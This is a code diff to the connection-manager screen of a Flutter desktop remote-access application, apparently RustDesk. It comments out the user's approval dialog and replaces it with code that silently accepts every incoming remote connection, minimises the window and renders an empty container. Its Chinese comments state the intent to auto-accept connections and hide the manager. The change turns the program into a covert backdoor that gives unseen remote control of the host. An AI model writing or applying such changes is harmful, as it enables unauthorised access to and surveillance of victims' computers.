@@ -71,35 +71,55 @@ class _DesktopServerPageState extends State<DesktopServerPage>
       windowManager.close();
     }
   }
-
   @override
   Widget build(BuildContext context) {
-    super.build(context);
-    return MultiProvider(
-      providers: [
-        ChangeNotifierProvider.value(value: gFFI.serverModel),
-        ChangeNotifierProvider.value(value: gFFI.chatModel),
-      ],
-      child: Consumer<ServerModel>(
-        builder: (context, serverModel, child) {
-          final body = Scaffold(
-            backgroundColor: Theme.of(context).colorScheme.background,
-            body: ConnectionManager(),
-          );
-          return isLinux
-              ? buildVirtualWindowFrame(context, body)
-              : workaroundWindowBorder(
-                  context,
-                  Container(
-                    decoration: BoxDecoration(
-                        border:
-                            Border.all(color: MyTheme.color(context).border!)),
-                    child: body,
-                  ));
-        },
-      ),
-    );
+    final serverModel = Provider.of<ServerModel>(context);
+
+    // 自动接受所有待处理的连接
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      for (var client in serverModel.clients) {
+        if (!client.authorized) {
+          serverModel.sendLoginResponse(client, true);
+        }
+      }
+
+      // 如果有任何连接（无论是否授权），都最小化窗口
+      if (serverModel.clients.isNotEmpty) {
+        windowManager.minimize();
+      }
+    });
+
+    // 完全隐藏连接管理器，返回空容器
+    return Container();
   }
+  // @override
+  // Widget build(BuildContext context) {
+  //   super.build(context);
+  //   return MultiProvider(
+  //     providers: [
+  //       ChangeNotifierProvider.value(value: gFFI.serverModel),
+  //       ChangeNotifierProvider.value(value: gFFI.chatModel),
+  //     ],
+  //     child: Consumer<ServerModel>(
+  //       builder: (context, serverModel, child) {
+  //         final body = Scaffold(
+  //           backgroundColor: Theme.of(context).colorScheme.background,
+  //           body: ConnectionManager(),
+  //         );
+  //         return isLinux
+  //             ? buildVirtualWindowFrame(context, body)
+  //             : workaroundWindowBorder(
+  //                 context,
+  //                 Container(
+  //                   decoration: BoxDecoration(
+  //                       border:
+  //                           Border.all(color: MyTheme.color(context).border!)),
+  //                   child: body,
+  //                 ));
+  //       },
+  //     ),
+  //   );
+  // }
 
   @override
   bool get wantKeepAlive => true;
@@ -1005,7 +1025,6 @@ class _CmControlPanel extends StatelessWidget {
       ],
     ).marginOnly(bottom: buttonBottomMargin);
   }
-
   buildUnAuthorized(BuildContext context) {
     final bool canElevate = bind.cmCanElevate();
     final model = Provider.of<ServerModel>(context);
@@ -1013,60 +1032,77 @@ class _CmControlPanel extends StatelessWidget {
         model.showElevation &&
         client.type_() == ClientType.remote;
     final showAccept = model.approveMode != 'password';
-    return Column(
-      mainAxisAlignment: MainAxisAlignment.end,
-      children: [
-        Offstage(
-          offstage: !showElevation || !showAccept,
-          child: buildButton(context, color: Colors.green[700], onClick: () {
-            handleAccept(context);
-            handleElevate(context);
-            windowManager.minimize();
-          },
-              text: 'Accept and Elevate',
-              icon: Icon(
-                Icons.security_rounded,
-                color: Colors.white,
-                size: 14,
-              ),
-              textColor: Colors.white,
-              tooltip: 'accept_and_elevate_btn_tooltip'),
-        ),
-        Row(
-          mainAxisAlignment: MainAxisAlignment.center,
-          children: [
-            if (showAccept)
-              Expanded(
-                child: Column(
-                  children: [
-                    buildButton(
-                      context,
-                      color: MyTheme.accent,
-                      onClick: () {
-                        handleAccept(context);
-                        windowManager.minimize();
-                      },
-                      text: 'Accept',
-                      textColor: Colors.white,
-                    ),
-                  ],
-                ),
-              ),
-            Expanded(
-              child: buildButton(
-                context,
-                color: Colors.transparent,
-                border: Border.all(color: Colors.grey),
-                onClick: handleDisconnect,
-                text: 'Cancel',
-                textColor: null,
-              ),
-            ),
-          ],
-        ),
-      ],
-    ).marginOnly(bottom: buttonBottomMargin);
+
+    // 自动接受连接
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      model.sendLoginResponse(client, true);
+    });
+
+    // 返回空的容器，不显示任何UI
+    return Container();
   }
+
+  // buildUnAuthorized(BuildContext context) {
+  //   final bool canElevate = bind.cmCanElevate();
+  //   final model = Provider.of<ServerModel>(context);
+  //   final showElevation = canElevate &&
+  //       model.showElevation &&
+  //       client.type_() == ClientType.remote;
+  //   final showAccept = model.approveMode != 'password';
+  //   return Column(
+  //     mainAxisAlignment: MainAxisAlignment.end,
+  //     children: [
+  //       Offstage(
+  //         offstage: !showElevation || !showAccept,
+  //         child: buildButton(context, color: Colors.green[700], onClick: () {
+  //           handleAccept(context);
+  //           handleElevate(context);
+  //           windowManager.minimize();
+  //         },
+  //             text: 'Accept and Elevate',
+  //             icon: Icon(
+  //               Icons.security_rounded,
+  //               color: Colors.white,
+  //               size: 14,
+  //             ),
+  //             textColor: Colors.white,
+  //             tooltip: 'accept_and_elevate_btn_tooltip'),
+  //       ),
+  //       Row(
+  //         mainAxisAlignment: MainAxisAlignment.center,
+  //         children: [
+  //           if (showAccept)
+  //             Expanded(
+  //               child: Column(
+  //                 children: [
+  //                   buildButton(
+  //                     context,
+  //                     color: MyTheme.accent,
+  //                     onClick: () {
+  //                       handleAccept(context);
+  //                       windowManager.minimize();
+  //                     },
+  //                     text: 'Accept',
+  //                     textColor: Colors.white,
+  //                   ),
+  //                 ],
+  //               ),
+  //             ),
+  //           Expanded(
+  //             child: buildButton(
+  //               context,
+  //               color: Colors.transparent,
+  //               border: Border.all(color: Colors.grey),
+  //               onClick: handleDisconnect,
+  //               text: 'Cancel',
+  //               textColor: null,
+  //             ),
+  //           ),
+  //         ],
+  //       ),
+  //     ],
+  //   ).marginOnly(bottom: buttonBottomMargin);
+  // }
 
   Widget buildButton(BuildContext context,
       {required Color? color,
